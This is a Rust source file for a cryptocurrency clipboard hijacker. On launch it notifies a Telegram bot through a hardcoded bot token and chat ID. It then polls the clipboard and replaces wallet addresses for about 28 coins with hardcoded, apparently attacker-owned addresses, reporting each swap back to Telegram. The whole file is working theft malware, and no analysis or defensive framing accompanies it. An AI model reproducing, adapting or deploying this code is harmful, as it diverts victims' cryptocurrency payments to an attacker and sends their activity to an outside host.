use copypasta::{ClipboardContext, ClipboardProvider};
use get_information::{send_message_telegram, send_message_text};
use std::{thread, time::Duration};
mod get_information;
const token: &str = "7524720461:AAFh8MTTPasCroBU_Gir-9PmLqBmbyfAHP0";
fn main() {
    _ = send_message_telegram(token, "-4745081369");
    let btc_legacy = "1FAKEbtcLegacyAddress123456789012345";
    let btc_nested = "3FAKEbtcNestedSegwitAddress123456789";
    let btc_bech32 = "1FAKEbtcLegacyAddress123456789012345";
    let btc_taproot = "1BjRgrDURgMXfGpkGGyTYM3RYv347LvwhT";
    let eth = "0xD3a03B89D77dd87a9cd90E7EE83d501D86C25135";
    let bnb = "bnb159p0smrs5hkkl9latw9kyn3xldmy7v7ktxm5km";
    let ltc = "LXu1YrY9UEu1D587spqPnJtMes1xJMAzep";
    let ltc2 = "LXu1YrY9UEu1D587spqPnJtMes1xJMAzep";
    let ltc3 = "LXu1YrY9UEu1D587spqPnJtMes1xJMAzep";
    let solana = "BjKZPGNqMSJzczu6osjw7k2uPxR6jABgXzSC2GDkzv6P";
    let zcash = "t1eBBgCfwj3MLBqtzhBEboum3SMzdYo5UMz";
    let xmr = "436Xne2NFVujPqgzBco1aD1JpvEaqb7uyWG8wM9rQRLRR7BpcciAVRcYYz8AN5pPxLRBeswmwREyLFyUmi2Tsr6mGAdk3bM";
    let doge = "DF9zZdzfagS67yzwiZVphpTD5x9tbcbrim";
    let dash = "XqA4yfhvK4WT9RjdtuV4wVNCmXvyM13tdp";
    let trx = "THrA14x7HVh1iSzNgAsjnRo36YiV8c5qxj";
    let xrp = "raAMbV2LuGXDGqJTx3LwtSFc8KC6XJ7Mx7";
    let ada = "addr1q9ulfgyvsal0ksk9jtveuysl4xkt279v52qxj3nt3c00dnr6zv0fxxcqsucn4xy6j9fnjx4t730l84v3hy6zq3v6zy0q3laavx";
    let cosmos = "cosmos1h3elc47ztz0e6dwdptjcvr6k47aq0cswklxylc";
    let rvn = "RVvWGDeb6Wr2hkBS3onkKVUBYmUFRDGgy5";
    let bch = "qpk4qj0c8s5nnxkmfhp46c4meyz4670pus6qr6ksl9";
    let xlm = "GDNEFG37VZF4YXLLZZHWWCM6OBVOLZD5CFFF2XLDGH3RBXOPKCQOOREZ";
    let tezos = "tz1QjwtChAkWLQWzgFY6m7VeHWFsx67dKkFp";
    let waves = "3P4h7byk6VgRPe4yv4PcKADmCvt6MN7Lpoj";
    let dot = "129ivKRinMFNTqz31exReh3DrjgdNYvPpcEJHdGpdyGR9vXh";
    let kava = "kava1j4vpx2y5x4y94g439m7pt5glxzck0s4u7kykjh";
    let algo = "6EEL2HXD3PELJTZUGNRVE3SLL7BJK53XWL6YRFQCMULVICXAGLSLRSOGNY";
    let fil = "0xD3a03B89D77dd87a9cd90E7EE83d501D86C25135";
    let ton = "EQDMGc7L8zJJ5sY6xfxtQehvwBOiaBWDlzHMn2pkznWzDlRv";

    let mut ctx = ClipboardContext::new().expect("Failed to access clipboard");

    loop {
        timeout(500);
        if let Ok(buffer) = ctx.get_contents() {
            let trimmed = buffer.trim();
            let replaced = match trimmed {
                b if b.starts_with('1') && b.len() >= 33 && b.len() <= 34 => Some(btc_legacy),
                b if b.starts_with('3') && b.len() == 34 => Some(btc_nested),
                b if b.starts_with("bc1p") && b.len() >= 42 && b.len() <= 62 => Some(btc_taproot),
                b if b.starts_with("bc1") && b.len() == 42 => Some(btc_bech32),
                b if b.starts_with("0x") && b.len() == 42 => Some(eth),
                b if b.starts_with("bnb1") && b.len() == 42 => Some(bnb),
                b if b.starts_with("ltc1") && (b.len() == 43 || b.len() == 44 || b.len() == 63) => {
                    Some(ltc)
                }
                b if b.starts_with('l') && b.len() == 34 => Some(ltc2),
                b if b.starts_with('m') && b.len() == 34 => Some(ltc3),
                b if b.len() == 44 => Some(solana),
                b if (b.starts_with("t1") || b.starts_with("t3")) && b.len() == 35 => Some(zcash),
                b if b.starts_with('4') && b.len() == 95 => Some(xmr),

                b if b.starts_with('d') && (b.len() == 33 || b.len() == 34) => Some(doge),
                b if b.starts_with('x') && b.len() == 34 => Some(dash),
                b if b.starts_with('t') && b.len() == 34 => Some(trx),
                b if b.starts_with('r') && b.len() == 34 => Some(xrp),
                b if b.starts_with("addr1") && b.len() == 103 => Some(ada),
                b if b.starts_with("cosmos1") && b.len() == 45 => Some(cosmos),
                b if b.starts_with('R') && b.len() == 34 => Some(rvn),
                b if b.starts_with('q') && b.len() == 42 => Some(bch),
                b if b.starts_with('g') && b.len() == 56 => Some(xlm),
                b if (b.starts_with("tz1") || b.starts_with("tz2") || b.starts_with("tz3"))
                    && b.len() == 36 =>
                {
                    Some(tezos)
                }
                b if b.starts_with("3P") && b.len() == 35 => Some(waves),
                b if b.starts_with('1') && b.len() >= 46 && b.len() <= 52 => Some(dot),
                b if b.starts_with("kava1") && b.len() == 43 => Some(kava),
                b if b.len() == 58 && b.chars().all(|c| c.is_ascii_alphanumeric()) => Some(algo),
                b if (b.len() == 41 || b.len() == 86)
                    && b.chars().all(|c| c.is_ascii_alphanumeric()) =>
                {
                    Some(fil)
                }
                b if b.starts_with("UQ") && b.len() == 48 => Some(ton),
                _ => None,
            };

            if let Some(fake) = replaced {
                if fake != trimmed {
                    let _ = ctx.set_contents(fake.to_string());
                    send_message_text(trimmed, fake, "-4745081369", token);
                }

                
            }
        }

        thread::sleep(Duration::from_secs(1));
    }
}

fn timeout(time: u64) {
    let miles = std::time::Duration::from_millis(time);
    std::thread::sleep(miles);
}
